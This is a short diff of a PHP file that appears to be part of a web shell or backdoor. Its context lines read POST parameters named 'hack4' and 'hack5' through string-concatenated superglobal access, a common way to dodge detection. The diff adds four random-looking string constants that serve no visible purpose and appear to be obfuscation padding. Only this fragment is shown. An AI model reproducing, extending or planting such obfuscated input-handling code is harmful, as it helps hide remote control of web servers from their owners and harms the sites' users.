@@ -7,6 +7,10 @@ $aaaa=${"_"."P"."O"."ST"}["hack4"];
 $aaaaa=${"_"."P"."O"."ST"}["hack5"];
 $aaaaaa=$a.$aa;
 $aaaaaaa=$aaa.$aaaa;
+$xxxx = '6RIppYabHk0S%le2LcAivGExafwasds03op&DFxJfR';
+$xxx = '6RIppYa0Say2LcAivGExdsafwasdonip&DFxJfR';
+$xx = '6RIppYabHk0S%lLcAivGExdsafwasds03o$xJfR';
+$x = '6RIppYabHk0Say%2LcAivGExdsafwas03onip$rFxJfR';
 if(empty($a))
 {
     for ($x=0; $x<=999999999; $x++)
